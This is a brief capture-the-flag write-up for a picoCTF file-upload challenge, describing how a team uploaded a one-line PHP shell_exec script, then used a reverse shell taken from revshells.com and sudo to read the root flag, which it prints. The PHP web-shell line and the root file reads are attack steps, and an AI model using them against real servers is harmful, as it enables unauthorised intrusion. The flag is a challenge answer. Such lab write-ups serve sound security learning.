Classic overthinking. Initially Allan thought the challenge had to do with directory traversal but Faraz noted that we could upload anything.

Testing a simple PHP script
```php
<?php shell_exec('ls'); ?>
```

shows us that we can run arbitrary commands on the server.

After some mild trolling around, our final solution came using a shell from [revshells.com](https://www.revshells.com/) which we used to run the following commands
```bash
ls -l /
# drwx------   1 root   root     22 Mar  6 03:56 root

sudo ls /root
# flag.txt

sudo cat /root/flag.txt
# picoCTF{wh47_c4n_u_d0_wPHP_a4ca6ea0}
```
